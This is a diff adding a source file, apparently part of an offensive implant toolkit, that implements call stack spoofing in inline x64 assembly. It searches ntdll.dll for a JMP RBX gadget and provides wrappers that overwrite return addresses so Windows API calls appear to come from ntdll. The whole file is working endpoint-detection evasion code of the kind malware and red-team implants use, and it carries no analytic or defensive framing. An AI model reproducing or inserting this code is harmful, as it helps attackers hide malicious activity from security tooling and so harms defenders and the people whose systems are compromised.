@@ -1,0 +1,230 @@
+
+// JMP RBX gadget cache. Zero = not yet discovered.
+static __opsec_jmp_rbx_gadget: u64 = 0;
+
+static __opsec_gadget_tried: u64 = 0;
+
+fn __opsec_find_jmp_rbx() -> u64 {
+    var h: void* = Kernel32.GetModuleHandleA("ntdll.dll");
+    if h == (void*)0 { ret 0; }
+    var base: char* = (char*)Kernel32.GetProcAddress(h, "NtAllocateVirtualMemory");
+    if base == (char*)0 { ret 0; }
+    var i: int = 0;
+    while i < 0x40000 {
+        if base[i] == (u8)0xFF {
+            if base[i + 1] == (u8)0xE3 {
+                ret (u64)(base + i);
+            }
+        }
+        i = i + 1;
+    }
+    ret 0;
+}
+
+// Public initializer. Operators can call this from a [Override]
+// or from the top of go to do the gadget discovery eagerly
+// instead of paying for it on the first stackspoof_callN. Idempotent.
+fn stackspoof_init() -> u64 {
+    if __opsec_gadget_tried != 0 { ret __opsec_jmp_rbx_gadget; }
+    var g: u64 = __opsec_find_jmp_rbx();
+    __opsec_jmp_rbx_gadget = g;
+    __opsec_gadget_tried   = 1;
+    ret g;
+}
+
+
+fn stackspoof_call0(fn_ptr: u64) -> u64 {
+    asm {
+        // --- Lazy init ---
+        mov r11, %__opsec_jmp_rbx_gadget
+        test r11, r11
+        jnz have0
+        // Mark "tried" before calling discovery so a re-entry
+        // from the discovery path can't recurse infinitely.
+        mov rax, 1
+        mov %__opsec_gadget_tried, rax
+        push rcx
+        sub rsp, 0x20
+        call %__opsec_find_jmp_rbx
+        add rsp, 0x20
+        pop rcx
+        mov %__opsec_jmp_rbx_gadget, rax
+        mov r11, rax
+        test r11, r11
+        jnz have0
+        // Gadget unavailable. Fall back to a plain call so user
+        // code still works - just without the spoof benefit.
+        mov rax, %fn_ptr
+        call rax
+        ret
+    have0:
+        // Save real return.
+        mov rbx, [rbp + 8]
+        // Target.
+        mov rax, %fn_ptr
+        // Tear down our frame.
+        mov rsp, rbp
+        pop rbp
+        // Overwrite caller's RIP slot with the gadget.
+        mov [rsp], r11
+        // JMP target. Win64 alignment: rsp here = entry rsp
+        // (8-mod-16, the post-CALL state target expects).
+        jmp rax
+    }
+}
+
+fn stackspoof_call1(fn_ptr: u64, a0: u64) -> u64 {
+    asm {
+        mov r11, %__opsec_jmp_rbx_gadget
+        test r11, r11
+        jnz have1
+        mov rax, 1
+        mov %__opsec_gadget_tried, rax
+        push rcx
+        push rdx
+        sub rsp, 0x28
+        call %__opsec_find_jmp_rbx
+        add rsp, 0x28
+        pop rdx
+        pop rcx
+        mov %__opsec_jmp_rbx_gadget, rax
+        mov r11, rax
+        test r11, r11
+        jnz have1
+        mov rax, %fn_ptr
+        mov rcx, %a0
+        call rax
+        ret
+    have1:
+        mov rbx, [rbp + 8]
+        mov rax, %fn_ptr
+        mov rcx, %a0
+        mov rsp, rbp
+        pop rbp
+        mov [rsp], r11
+        jmp rax
+    }
+}
+
+fn stackspoof_call2(fn_ptr: u64, a0: u64, a1: u64) -> u64 {
+    asm {
+        mov r11, %__opsec_jmp_rbx_gadget
+        test r11, r11
+        jnz have2
+        mov rax, 1
+        mov %__opsec_gadget_tried, rax
+        push rcx
+        push rdx
+        push r8
+        push r9
+        sub rsp, 0x28
+        call %__opsec_find_jmp_rbx
+        add rsp, 0x28
+        pop r9
+        pop r8
+        pop rdx
+        pop rcx
+        mov %__opsec_jmp_rbx_gadget, rax
+        mov r11, rax
+        test r11, r11
+        jnz have2
+        mov rax, %fn_ptr
+        mov rcx, %a0
+        mov rdx, %a1
+        call rax
+        ret
+    have2:
+        mov rbx, [rbp + 8]
+        mov rax, %fn_ptr
+        mov rcx, %a0
+        mov rdx, %a1
+        mov rsp, rbp
+        pop rbp
+        mov [rsp], r11
+        jmp rax
+    }
+}
+
+fn stackspoof_call3(fn_ptr: u64, a0: u64, a1: u64, a2: u64) -> u64 {
+    asm {
+        mov r11, %__opsec_jmp_rbx_gadget
+        test r11, r11
+        jnz have3
+        mov rax, 1
+        mov %__opsec_gadget_tried, rax
+        push rcx
+        push rdx
+        push r8
+        push r9
+        sub rsp, 0x28
+        call %__opsec_find_jmp_rbx
+        add rsp, 0x28
+        pop r9
+        pop r8
+        pop rdx
+        pop rcx
+        mov %__opsec_jmp_rbx_gadget, rax
+        mov r11, rax
+        test r11, r11
+        jnz have3
+        mov rax, %fn_ptr
+        mov rcx, %a0
+        mov rdx, %a1
+        mov r8,  %a2
+        call rax
+        ret
+    have3:
+        mov rbx, [rbp + 8]
+        mov rax, %fn_ptr
+        mov rcx, %a0
+        mov rdx, %a1
+        mov r8,  %a2
+        mov rsp, rbp
+        pop rbp
+        mov [rsp], r11
+        jmp rax
+    }
+}
+
+fn stackspoof_call4(fn_ptr: u64, a0: u64, a1: u64, a2: u64, a3: u64) -> u64 {
+    asm {
+        mov r11, %__opsec_jmp_rbx_gadget
+        test r11, r11
+        jnz have4
+        mov rax, 1
+        mov %__opsec_gadget_tried, rax
+        push rcx
+        push rdx
+        push r8
+        push r9
+        sub rsp, 0x28
+        call %__opsec_find_jmp_rbx
+        add rsp, 0x28
+        pop r9
+        pop r8
+        pop rdx
+        pop rcx
+        mov %__opsec_jmp_rbx_gadget, rax
+        mov r11, rax
+        test r11, r11
+        jnz have4
+        mov rax, %fn_ptr
+        mov rcx, %a0
+        mov rdx, %a1
+        mov r8,  %a2
+        mov r9,  %a3
+        call rax
+        ret
+    have4:
+        mov rbx, [rbp + 8]
+        mov rax, %fn_ptr
+        mov rcx, %a0
+        mov rdx, %a1
+        mov r8,  %a2
+        mov r9,  %a3
+        mov rsp, rbp
+        pop rbp
+        mov [rsp], r11
+        jmp rax
+    }
+}
